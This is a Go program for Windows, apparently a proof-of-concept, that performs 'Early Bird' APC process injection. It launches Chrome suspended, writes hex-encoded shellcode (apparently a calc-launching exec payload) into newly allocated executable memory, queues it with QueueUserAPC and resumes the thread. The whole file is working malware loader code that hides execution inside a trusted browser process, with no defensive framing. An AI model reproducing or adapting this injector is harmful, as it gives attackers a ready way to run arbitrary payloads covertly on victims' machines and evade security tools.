package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"syscall"

	"golang.org/x/sys/windows"
)

func main() {
	sc, _ := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c6300")

	var startupInfo windows.StartupInfo
	var outProcInfo windows.ProcessInformation

	path := "C:\\Program Files\\Google\\Chrome\\Application\\Chrome.exe"

	err := windows.CreateProcess(nil,
		windows.StringToUTF16Ptr(path),
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		&startupInfo,
		&outProcInfo)

	if err != nil {
		log.Fatalf("[FATAL] Failed to Create Process: %v", err)
	}

	fmt.Printf("[+] Process Created from path: %s with PID: %d\n", path, outProcInfo.ProcessId)
	fmt.Printf("[+] Process Handle: %x \n[+] Thread Handle: %x\n", outProcInfo.Process, outProcInfo.Thread)

	modKernel32 := syscall.NewLazyDLL("kernel32.dll")
	procVirtualAllocEx := modKernel32.NewProc("VirtualAllocEx")

	addr, _, lastErr := procVirtualAllocEx.Call(
		uintptr(outProcInfo.Process),
		uintptr(0),
		uintptr(len(sc)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READ))

	if addr == 0 {
		log.Fatalf("[FATAL] VirtualAlloc Failed: %v\n", lastErr)
	}

	fmt.Printf("[+] Allocated Memory Address: 0x%x\n", addr)

	var numberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(outProcInfo.Process, uintptr(addr), &sc[0], uintptr(len(sc)), &numberOfBytesWritten)
	if err != nil {
		log.Fatalf("[FATAL] Failed to WriteProcessMemory: %v", err)
	}

	fmt.Printf("[+] Wrote %d/%d shellcode bytes to destination address\n", numberOfBytesWritten, len(sc))

	procQueueUserAPC := modKernel32.NewProc("QueueUserAPC")
	success1, _, lastErr := procQueueUserAPC.Call(addr, uintptr(outProcInfo.Thread), 0)
	if success1 == 0 {
		log.Fatalf("[FATAL] QueueUserAPC failed. %v\n", lastErr)
	}
	//time.Sleep(10 * time.Second)

	_, err = windows.ResumeThread(windows.Handle(outProcInfo.Thread))
	if err != nil {
		log.Fatalf("[FATAL] Can't resume thread. %v\n", err)
	}
	fmt.Println("[+] Resuming Suspended Thread")

}
